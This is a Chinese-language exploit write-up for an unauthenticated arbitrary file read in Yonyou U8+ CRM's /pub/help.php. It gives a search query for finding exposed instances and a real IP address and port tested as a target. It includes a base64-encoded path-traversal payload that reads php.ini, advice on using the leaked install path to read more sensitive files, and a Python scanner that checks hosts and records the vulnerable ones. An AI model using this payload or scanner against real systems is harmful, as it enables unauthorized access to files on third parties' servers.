## 一、资产搜索

```
body="用友 U8CRM"
```

## 二、网站测试

用友U8+CRM系统的help2文件中接口存在任意文件读取漏洞，攻击者在未登录情况下即可进行漏洞利用

```
http://61.134.99.170:18072
```

## 三、验证漏洞

poc1

```
/pub/help.php?key=YTozOntpOjA7czoyNDoiLy4uLy4uLy4uL2FwYWNoZS9waHAuaW5pIjtpOjE7czoxOiIxIjtpOjI7czoxOiIyIjt9
```

此网站用burp打不开，只能猜测返回内容格式

![image-20240904202433839](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240904202433839.png)

![image-20240904201540746](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240904201540746.png)

> 在此页查找error_log可看到此系统的安装路径，如果是C盘，则可查看更多敏感信息

![image-20240904201645736](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240904201645736.png)

## 四、POC

```
def poc(target):
    payload = "/pub/help.php?key=YTozOntpOjA7czoyNDoiLy4uLy4uLy4uL2FwYWNoZS9waHAuaW5pIjtpOjE7czoxOiIxIjtpOjI7czoxOiIyIjt9"
    res1 = requests.get(target,verify=False,timeout=5)
    try:
        if res1.status_code == 200:
            res2 = requests.get(target+payload,verify=False,timeout=5)
            # print(res2.text)
            if "error_log = syslog" in res2.text:
                with open("result.txt","a",encoding='utf-8') as f:
                    f.write(f"该网站[+]{target}存在任意文件读取漏洞\n")
                print(f"该网站[+]{target}存在任意文件读取漏洞")
            else:
                print(f"该网站[+]{target}不存在任意文件读取漏洞")
        else:
            print("连接超时，请重试")
    except Exception as e:
        print(e)
```

## 五、测试结果

![image-20240904203650110](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240904203650110.png)

![image-20240905182441781](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240905182441781.png)